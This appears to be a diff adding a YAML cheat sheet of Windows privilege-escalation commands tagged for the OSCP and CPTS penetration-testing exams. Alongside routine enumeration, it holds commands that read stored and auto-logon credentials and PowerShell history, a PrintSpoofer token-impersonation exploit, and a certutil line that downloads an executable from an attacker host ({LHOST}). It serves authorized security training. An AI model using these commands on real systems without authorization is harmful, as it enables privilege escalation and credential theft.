@@ -1,0 +1,110 @@
+category: "privesc-windows"
+description: "Windows privilege escalation techniques"
+commands:
+  - name: "winpeas"
+    description: "Run WinPEAS enumeration"
+    command: ".\\winPEASx64.exe"
+    tool: "winpeas"
+    tags: ["privesc", "windows", "enum", "auto"]
+    os: "windows"
+    exam: ["oscp", "cpts"]
+    notes: "Transfer to target first"
+
+  - name: "whoami-all"
+    description: "Full user context and privileges"
+    command: "whoami /all"
+    tool: "windows"
+    tags: ["privesc", "windows", "enum"]
+    os: "windows"
+    exam: ["oscp", "cpts"]
+
+  - name: "systeminfo"
+    description: "System information and patch level"
+    command: "systeminfo"
+    tool: "windows"
+    tags: ["privesc", "windows", "enum", "patches"]
+    os: "windows"
+    exam: ["oscp", "cpts"]
+
+  - name: "unquoted-service-paths"
+    description: "Find unquoted service paths"
+    command: "wmic service get name,displayname,pathname,startmode | findstr /i auto | findstr /i /v \"C:\\Windows\\\\\""
+    tool: "wmic"
+    tags: ["privesc", "windows", "services", "unquoted"]
+    os: "windows"
+    exam: ["oscp", "cpts"]
+
+  - name: "service-permissions"
+    description: "Check service permissions with accesschk"
+    command: "accesschk.exe /accepteula -uwcqv \"Authenticated Users\" * | findstr SERVICE"
+    tool: "accesschk"
+    tags: ["privesc", "windows", "services", "permissions"]
+    os: "windows"
+    exam: ["oscp", "cpts"]
+
+  - name: "scheduled-tasks"
+    description: "Enumerate scheduled tasks"
+    command: "schtasks /query /fo LIST /v | findstr /i \"Task To Run\\|Run As User\\|Schedule Type\""
+    tool: "windows"
+    tags: ["privesc", "windows", "tasks"]
+    os: "windows"
+    exam: ["oscp", "cpts"]
+
+  - name: "always-install-elevated"
+    description: "Check AlwaysInstallElevated registry"
+    command: "reg query HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated & reg query HKCU\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated"
+    tool: "reg"
+    tags: ["privesc", "windows", "registry", "msi"]
+    os: "windows"
+    exam: ["oscp", "cpts"]
+
+  - name: "stored-credentials"
+    description: "Check for stored credentials"
+    command: "cmdkey /list"
+    tool: "windows"
+    tags: ["privesc", "windows", "credentials"]
+    os: "windows"
+    exam: ["oscp", "cpts"]
+    notes: "If creds found: runas /savecred /user:DOMAIN\\USER cmd.exe"
+
+  - name: "autologon-creds"
+    description: "Check for auto-logon credentials in registry"
+    command: "reg query \"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\" 2>nul | findstr /i \"DefaultUserName DefaultPassword\""
+    tool: "reg"
+    tags: ["privesc", "windows", "credentials", "autologon"]
+    os: "windows"
+    exam: ["oscp", "cpts"]
+
+  - name: "seimpersonate-potato"
+    description: "SeImpersonatePrivilege exploitation with PrintSpoofer"
+    command: ".\\PrintSpoofer64.exe -c \"cmd /c whoami\""
+    tool: "printspoofer"
+    tags: ["privesc", "windows", "impersonate", "potato"]
+    os: "windows"
+    exam: ["oscp", "cpts"]
+    notes: "Use when whoami /priv shows SeImpersonatePrivilege. Alt: GodPotato, JuicyPotato"
+
+  - name: "internal-ports"
+    description: "Check internal listening ports"
+    command: "netstat -ano | findstr LISTENING"
+    tool: "windows"
+    tags: ["privesc", "windows", "ports", "internal"]
+    os: "windows"
+    exam: ["oscp", "cpts"]
+
+  - name: "powershell-history"
+    description: "Check PowerShell command history"
+    command: "type %APPDATA%\\Microsoft\\Windows\\PowerShell\\PSReadLine\\ConsoleHost_history.txt"
+    tool: "windows"
+    tags: ["privesc", "windows", "history", "credentials"]
+    os: "windows"
+    exam: ["oscp", "cpts"]
+
+  - name: "lolbas-certutil"
+    description: "Download file with certutil (LOLBAS)"
+    command: "certutil -urlcache -split -f http://{LHOST}/file.exe file.exe"
+    tool: "certutil"
+    tags: ["transfer", "windows", "lolbas", "download"]
+    os: "windows"
+    exam: ["oscp", "cpts"]
+    references: ["https://lolbas-project.github.io/"]
